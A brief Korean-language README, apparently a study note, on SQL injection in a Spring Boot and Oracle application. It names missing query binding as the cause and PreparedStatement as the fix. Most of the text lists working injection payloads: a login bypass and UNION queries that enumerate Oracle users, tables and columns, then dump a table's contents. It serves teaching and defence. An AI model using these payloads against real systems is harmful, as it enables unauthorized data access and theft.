# SQLInjection
### 발생 원인, 조치 : 
#### 발생 원인은 쿼리 바인딩이 제대로 이루어 지지 않은 경우 이며, 조치 또한 쿼리 바인딩(PreparedStatement) 처리 (바인딩 예시 이미지)
### Query Binding 예시(iBatis 또한 인젝션 가능한 바인딩의 경우는 동일)
![쿼리 바인딩](https://github.com/user-attachments/assets/6858c910-dffd-4d90-841d-929087c04735)  
### SQL Injection 구문 예시 (스프링 부트 + 오라클) 
#### 1. 간략 로그인 : ' OR '1'='1
![로그인](https://github.com/user-attachments/assets/7e6a73d8-094f-4a04-be11-3d1fc91bb25c)  
#### 2. 오라클 계정 리스트 : SELECT LISTAGG(table_name || ' - ' || tablespace_name), NULL(생략) FROM all_users--
![아이디](https://github.com/user-attachments/assets/65685703-9f77-48b8-b208-11b1a6f7a391)
#### 3. 오라클 계정 테이블 리스트 : SELECT LISTAGG(table_name || ' - ' || tablespace_name), NULL(생략) FROM user_tables--  
![유저테이블](https://github.com/user-attachments/assets/f4b2c3de-cb35-4dc9-babb-cfc2932e62c4)
#### 4. 오라클 특정 테이블 컬럼 상세 정보 / 위의 탈취한 테이블로 컬럼 값 추출
#### SELECT LISTAGG(column_name || ' - ' || data_type || ' - ' || data_length, ', ') WITHIN GROUP (ORDER BY column_id) AS combined_columns, NULL(생략) FROM user_tab_columns where table_name='BOOKCASE3'--  
![컬럼 정보](https://github.com/user-attachments/assets/49c4d45d-6b56-40cc-983d-10d1ed82b08a)
#### 5. 오라클 특정 테이블 원하는 정보 추출 / 위의 탈취한 테이블의 컬럼 값 으로 원하는 정보 추출
#### SELECT LISTAGG(title || ' - ' || writer || ' - ' || publisher), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL from BOOKCASE3--  
![전체추출](https://github.com/user-attachments/assets/757a3055-56a4-4ce0-af65-aa417f99b21e)


